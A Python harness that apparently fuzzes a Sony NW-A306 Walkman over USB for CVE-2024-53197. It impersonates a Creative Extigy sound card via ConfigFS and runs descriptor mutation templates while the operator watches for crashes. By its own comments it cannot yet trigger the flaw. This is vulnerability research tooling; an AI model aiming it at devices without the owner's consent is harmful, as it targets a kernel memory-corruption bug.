#!/usr/bin/env python3
"""
Raspberry Pi Zero USB Gadget Fuzzing Harness

Deploys CVE-2024-53197 mutation templates to Pi Zero for USB gadget fuzzing.
Generates ConfigFS scripts and manages fuzzing sessions.

Target: Sony NW-A306 Walkman (kernel 4.19.157)

USAGE:
    1. Copy this script and all_mutations.json to Pi Zero
    2. Run: sudo python3 pi_zero_harness.py --mutation <mutation_id>
    3. Connect Pi Zero to target device
    4. Monitor for crash/hang

REQUIREMENTS:
    - Raspberry Pi Zero / Zero W / Zero 2 W
    - Raspberry Pi OS with USB gadget support enabled
    - dwc2 overlay enabled in /boot/config.txt
    - libcomposite module available
"""

import argparse
import json
import os
import sys
import time
import subprocess
import logging
from pathlib import Path
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class GadgetConfig:
    """USB Gadget configuration"""
    name: str = "extigy_fuzzer"
    vid: int = 0x041e
    pid: int = 0x3000
    bcdUSB: int = 0x0200
    bcdDevice: int = 0x0100
    bDeviceClass: int = 0x00
    bDeviceSubClass: int = 0x00
    bDeviceProtocol: int = 0x00
    bMaxPacketSize0: int = 64
    manufacturer: str = "Creative Technology"
    product: str = "Sound Blaster Extigy"
    serial: str = "FUZZ001"
    bNumConfigurations: int = 1
    wTotalLength: int = 794


class PiZeroGadgetManager:
    """Manages USB gadget configuration on Pi Zero"""

    GADGET_BASE = "/sys/kernel/config/usb_gadget"
    REQUIRED_MODULES = ["libcomposite", "usb_f_uac2", "dwc2"]

    def __init__(self, config: GadgetConfig):
        self.config = config
        self.gadget_path = Path(self.GADGET_BASE) / config.name
        self.is_enabled = False

    def check_prerequisites(self) -> bool:
        """Check if Pi Zero is properly configured for USB gadget mode"""
        errors = []

        # Check if running as root
        if os.geteuid() != 0:
            errors.append("Must run as root (sudo)")

        # Check if ConfigFS is mounted
        if not Path(self.GADGET_BASE).exists():
            errors.append(f"ConfigFS not mounted at {self.GADGET_BASE}")

        # Check for UDC
        udc_path = Path("/sys/class/udc")
        if not udc_path.exists() or not list(udc_path.iterdir()):
            errors.append("No USB Device Controller found")

        # Check boot config
        boot_config = Path("/boot/config.txt")
        if boot_config.exists():
            content = boot_config.read_text()
            if "dtoverlay=dwc2" not in content:
                errors.append("dwc2 overlay not enabled in /boot/config.txt")

        if errors:
            for err in errors:
                logger.error(err)
            return False

        return True

    def load_modules(self) -> bool:
        """Load required kernel modules"""
        for module in self.REQUIRED_MODULES:
            result = subprocess.run(
                ["modprobe", module],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                logger.warning(f"Could not load module {module}: {result.stderr}")
        return True

    def cleanup_gadget(self):
        """Remove existing gadget configuration"""
        if not self.gadget_path.exists():
            return

        logger.info(f"Cleaning up existing gadget: {self.config.name}")

        try:
            # Disable UDC
            udc_file = self.gadget_path / "UDC"
            if udc_file.exists():
                udc_file.write_text("")

            # Remove function symlinks from configs
            configs_path = self.gadget_path / "configs"
            if configs_path.exists():
                for config_dir in configs_path.iterdir():
                    for item in config_dir.iterdir():
                        if item.is_symlink():
                            item.unlink()
                    # Remove strings
                    strings_dir = config_dir / "strings"
                    if strings_dir.exists():
                        for lang_dir in strings_dir.iterdir():
                            lang_dir.rmdir()
                        strings_dir.rmdir()
                    config_dir.rmdir()
                configs_path.rmdir()

            # Remove functions
            funcs_path = self.gadget_path / "functions"
            if funcs_path.exists():
                for func_dir in funcs_path.iterdir():
                    func_dir.rmdir()
                funcs_path.rmdir()

            # Remove strings
            strings_path = self.gadget_path / "strings"
            if strings_path.exists():
                for lang_dir in strings_path.iterdir():
                    lang_dir.rmdir()
                strings_path.rmdir()

            # Remove gadget
            self.gadget_path.rmdir()

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

        self.is_enabled = False

    def create_gadget(self) -> bool:
        """Create and configure USB gadget"""
        logger.info(f"Creating gadget: {self.config.name}")

        try:
            # Create gadget directory
            self.gadget_path.mkdir(parents=True, exist_ok=True)

            # Write device descriptor values
            (self.gadget_path / "idVendor").write_text(f"0x{self.config.vid:04x}")
            (self.gadget_path / "idProduct").write_text(f"0x{self.config.pid:04x}")
            (self.gadget_path / "bcdUSB").write_text(f"0x{self.config.bcdUSB:04x}")
            (self.gadget_path / "bcdDevice").write_text(f"0x{self.config.bcdDevice:04x}")
            (self.gadget_path / "bDeviceClass").write_text(f"0x{self.config.bDeviceClass:02x}")
            (self.gadget_path / "bDeviceSubClass").write_text(f"0x{self.config.bDeviceSubClass:02x}")
            (self.gadget_path / "bDeviceProtocol").write_text(f"0x{self.config.bDeviceProtocol:02x}")
            (self.gadget_path / "bMaxPacketSize0").write_text(str(self.config.bMaxPacketSize0))

            # Create strings (English)
            strings_path = self.gadget_path / "strings" / "0x409"
            strings_path.mkdir(parents=True, exist_ok=True)
            (strings_path / "manufacturer").write_text(self.config.manufacturer)
            (strings_path / "product").write_text(self.config.product)
            (strings_path / "serialnumber").write_text(self.config.serial)

            # Create configuration
            config_path = self.gadget_path / "configs" / "c.1"
            config_path.mkdir(parents=True, exist_ok=True)
            (config_path / "MaxPower").write_text("500")
            (config_path / "bmAttributes").write_text("0xc0")

            # Configuration strings
            config_strings = config_path / "strings" / "0x409"
            config_strings.mkdir(parents=True, exist_ok=True)
            (config_strings / "configuration").write_text("Audio Config")

            # Create UAC2 function (Audio Class 2.0)
            func_path = self.gadget_path / "functions" / "uac2.usb0"
            func_path.mkdir(parents=True, exist_ok=True)

            # Configure audio parameters
            (func_path / "c_chmask").write_text("3")    # Stereo capture
            (func_path / "c_srate").write_text("48000")  # 48kHz
            (func_path / "c_ssize").write_text("2")      # 16-bit
            (func_path / "p_chmask").write_text("3")    # Stereo playback
            (func_path / "p_srate").write_text("48000")
            (func_path / "p_ssize").write_text("2")

            # Link function to config
            link_target = func_path
            link_name = config_path / "uac2.usb0"
            if not link_name.exists():
                link_name.symlink_to(link_target)

            logger.info("Gadget created successfully")
            return True

        except Exception as e:
            logger.error(f"Failed to create gadget: {e}")
            return False

    def enable_gadget(self) -> bool:
        """Enable the gadget by binding to UDC"""
        logger.info("Enabling gadget...")

        try:
            # Find UDC
            udc_path = Path("/sys/class/udc")
            udcs = list(udc_path.iterdir())
            if not udcs:
                logger.error("No UDC found")
                return False

            udc_name = udcs[0].name
            logger.info(f"Using UDC: {udc_name}")

            # Bind to UDC
            (self.gadget_path / "UDC").write_text(udc_name)

            self.is_enabled = True
            logger.info("Gadget enabled")
            return True

        except Exception as e:
            logger.error(f"Failed to enable gadget: {e}")
            return False

    def disable_gadget(self):
        """Disable the gadget"""
        if not self.is_enabled:
            return

        logger.info("Disabling gadget...")
        try:
            (self.gadget_path / "UDC").write_text("")
            self.is_enabled = False
        except Exception as e:
            logger.error(f"Failed to disable gadget: {e}")


class CVE202453197Fuzzer:
    """
    Fuzzing harness for CVE-2024-53197

    NOTE: Standard ConfigFS cannot change bNumConfigurations after enumeration.
    This harness provides the framework - actual descriptor modification requires:
    1. Custom kernel module to intercept GET_DESCRIPTOR requests
    2. Modified dwc2 driver
    3. External hardware (Facedancer)

    This implementation demonstrates the attack concept and provides
    test infrastructure for when low-level descriptor modification is available.
    """

    def __init__(self, mutations_file: str = "all_mutations.json"):
        self.mutations: List[Dict] = []
        self.mutations_file = mutations_file
        self.results: List[Dict] = []
        self.current_mutation: Optional[Dict] = None

        self.load_mutations()

    def load_mutations(self):
        """Load mutation templates from JSON"""
        if not Path(self.mutations_file).exists():
            logger.warning(f"Mutations file not found: {self.mutations_file}")
            return

        with open(self.mutations_file, 'r') as f:
            data = json.load(f)
            self.mutations = data.get('mutations', [])

        logger.info(f"Loaded {len(self.mutations)} mutations")

    def get_mutation(self, mutation_id: str) -> Optional[Dict]:
        """Get a specific mutation by ID"""
        for m in self.mutations:
            if m['id'] == mutation_id:
                return m
        return None

    def get_critical_mutations(self) -> List[Dict]:
        """Get all critical severity mutations"""
        return [m for m in self.mutations if m.get('severity') == 'critical']

    def get_bnum_mutations(self) -> List[Dict]:
        """Get bNumConfigurations overflow mutations"""
        return [
            m for m in self.mutations
            if 'bNumConfigurations' in m.get('mutation_type', '') or
               'bnum' in m.get('name', '').lower()
        ]

    def mutation_to_gadget_config(self, mutation: Dict) -> GadgetConfig:
        """Convert mutation template to GadgetConfig"""
        dev_desc = mutation.get('device_descriptor', {})
        cfg_desc = mutation.get('config_descriptor', {})

        # Parse VID/PID
        vid = dev_desc.get('idVendor', '0x041e')
        if isinstance(vid, str):
            vid = int(vid, 16)

        pid = dev_desc.get('idProduct', '0x3000')
        if isinstance(pid, str):
            pid = int(pid, 16)

        # Get wTotalLength (triggers quirk)
        wTotalLength = cfg_desc.get('wTotalLength', 794)

        return GadgetConfig(
            name=f"fuzz_{mutation['id']}",
            vid=vid,
            pid=pid,
            wTotalLength=wTotalLength,
            serial=f"FUZZ-{mutation['id']}"
        )

    def run_mutation(self, mutation: Dict, duration_seconds: int = 10) -> Dict:
        """
        Run a single mutation test

        Returns result dictionary with outcome
        """
        self.current_mutation = mutation
        result = {
            "mutation_id": mutation['id'],
            "mutation_name": mutation['name'],
            "timestamp": datetime.now().isoformat(),
            "duration_seconds": duration_seconds,
            "outcome": "unknown",
            "notes": []
        }

        logger.info(f"Running mutation: {mutation['name']}")
        logger.info(f"  Type: {mutation.get('mutation_type')}")
        logger.info(f"  Severity: {mutation.get('severity')}")
        logger.info(f"  Expected: {mutation.get('expected_impact')}")

        # Create gadget config
        config = self.mutation_to_gadget_config(mutation)
        manager = PiZeroGadgetManager(config)

        # Check prerequisites
        if not manager.check_prerequisites():
            result["outcome"] = "prereq_failed"
            result["notes"].append("Prerequisites check failed")
            return result

        try:
            # Load modules
            manager.load_modules()

            # Cleanup any existing gadget
            manager.cleanup_gadget()

            # Create new gadget
            if not manager.create_gadget():
                result["outcome"] = "gadget_creation_failed"
                return result

            # Enable gadget
            if not manager.enable_gadget():
                result["outcome"] = "gadget_enable_failed"
                return result

            result["notes"].append("Gadget enabled successfully")

            # Show attack parameters
            post_desc = mutation.get('post_quirk_descriptor', {})
            post_bnum = post_desc.get('bNumConfigurations', 1)
            oob_size = (post_bnum - 1) * 272

            logger.info(f"  Target bNumConfigurations: {post_bnum}")
            logger.info(f"  Expected OOB: {oob_size} bytes")
            logger.info("")
            logger.info(">>> IMPORTANT <<<")
            logger.info("Standard ConfigFS cannot modify descriptors mid-connection.")
            logger.info("To actually trigger the vulnerability, you need:")
            logger.info("  1. Custom kernel module to intercept GET_DESCRIPTOR")
            logger.info("  2. Modified dwc2 driver")
            logger.info("  3. Facedancer hardware")
            logger.info("")
            logger.info(f"Gadget active for {duration_seconds} seconds...")
            logger.info("Connect target device now and watch for crash...")

            # Wait for test duration
            time.sleep(duration_seconds)

            result["outcome"] = "completed"
            result["notes"].append(f"Gadget active for {duration_seconds}s")

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            result["outcome"] = "interrupted"

        except Exception as e:
            logger.error(f"Error during test: {e}")
            result["outcome"] = "error"
            result["notes"].append(str(e))

        finally:
            # Cleanup
            manager.cleanup_gadget()

        self.results.append(result)
        return result

    def run_batch(self, mutations: List[Dict], duration_each: int = 10):
        """Run multiple mutations in sequence"""
        logger.info(f"Starting batch run of {len(mutations)} mutations")

        for i, mutation in enumerate(mutations, 1):
            logger.info(f"\n{'='*60}")
            logger.info(f"Mutation {i}/{len(mutations)}")
            logger.info(f"{'='*60}")

            result = self.run_mutation(mutation, duration_each)

            if result["outcome"] == "interrupted":
                break

            # Brief pause between tests
            time.sleep(2)

        logger.info(f"\nBatch complete. Ran {len(self.results)} tests.")

    def export_results(self, filepath: str = "fuzzing_results.json"):
        """Export results to JSON"""
        with open(filepath, 'w') as f:
            json.dump({
                "session_time": datetime.now().isoformat(),
                "total_tests": len(self.results),
                "results": self.results
            }, f, indent=2)

        logger.info(f"Results exported to {filepath}")


def generate_setup_script():
    """Generate Pi Zero setup script"""
    script = '''#!/bin/bash
# Pi Zero USB Gadget Setup Script
# Run this once on the Pi Zero to enable USB gadget mode

set -e

echo "Configuring Pi Zero for USB gadget mode..."

# Backup config files
cp /boot/config.txt /boot/config.txt.bak
cp /boot/cmdline.txt /boot/cmdline.txt.bak

# Add dwc2 overlay
if ! grep -q "dtoverlay=dwc2" /boot/config.txt; then
    echo "dtoverlay=dwc2" >> /boot/config.txt
    echo "Added dwc2 overlay to config.txt"
fi

# Add modules to cmdline (after rootwait)
if ! grep -q "modules-load=dwc2,libcomposite" /boot/cmdline.txt; then
    sed -i 's/rootwait/rootwait modules-load=dwc2,libcomposite/' /boot/cmdline.txt
    echo "Added modules to cmdline.txt"
fi

# Load modules now (for testing)
modprobe libcomposite
modprobe usb_f_uac2

echo ""
echo "Setup complete! Please reboot for changes to take effect."
echo ""
echo "After reboot, run the fuzzer with:"
echo "  sudo python3 pi_zero_harness.py --mutation MUT-0001"
'''
    return script


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-53197 USB Gadget Fuzzing Harness for Pi Zero'
    )
    parser.add_argument(
        '--mutation', '-m',
        help='Mutation ID to test (e.g., MUT-0001)'
    )
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=10,
        help='Duration in seconds for each test (default: 10)'
    )
    parser.add_argument(
        '--batch-critical',
        action='store_true',
        help='Run all critical severity mutations'
    )
    parser.add_argument(
        '--batch-bnum',
        action='store_true',
        help='Run all bNumConfigurations overflow mutations'
    )
    parser.add_argument(
        '--list-mutations',
        action='store_true',
        help='List available mutations'
    )
    parser.add_argument(
        '--setup-script',
        action='store_true',
        help='Generate Pi Zero setup script'
    )
    parser.add_argument(
        '--mutations-file',
        default='all_mutations.json',
        help='Path to mutations JSON file'
    )

    args = parser.parse_args()

    # Generate setup script
    if args.setup_script:
        script = generate_setup_script()
        print(script)
        return

    # Initialize fuzzer
    fuzzer = CVE202453197Fuzzer(args.mutations_file)

    # List mutations
    if args.list_mutations:
        print(f"\nAvailable mutations: {len(fuzzer.mutations)}")
        print("-" * 60)
        for m in fuzzer.mutations[:50]:  # Show first 50
            print(f"  [{m['severity'].upper():8}] {m['id']:12} {m['name']}")
        if len(fuzzer.mutations) > 50:
            print(f"  ... and {len(fuzzer.mutations) - 50} more")
        return

    # Run batch - critical
    if args.batch_critical:
        mutations = fuzzer.get_critical_mutations()
        logger.info(f"Found {len(mutations)} critical mutations")
        fuzzer.run_batch(mutations, args.duration)
        fuzzer.export_results()
        return

    # Run batch - bnum
    if args.batch_bnum:
        mutations = fuzzer.get_bnum_mutations()
        logger.info(f"Found {len(mutations)} bNumConfigurations mutations")
        fuzzer.run_batch(mutations[:20], args.duration)  # Limit to 20
        fuzzer.export_results()
        return

    # Run single mutation
    if args.mutation:
        mutation = fuzzer.get_mutation(args.mutation)
        if not mutation:
            logger.error(f"Mutation not found: {args.mutation}")
            sys.exit(1)

        fuzzer.run_mutation(mutation, args.duration)
        fuzzer.export_results()
        return

    # No action specified
    parser.print_help()


if __name__ == "__main__":
    main()
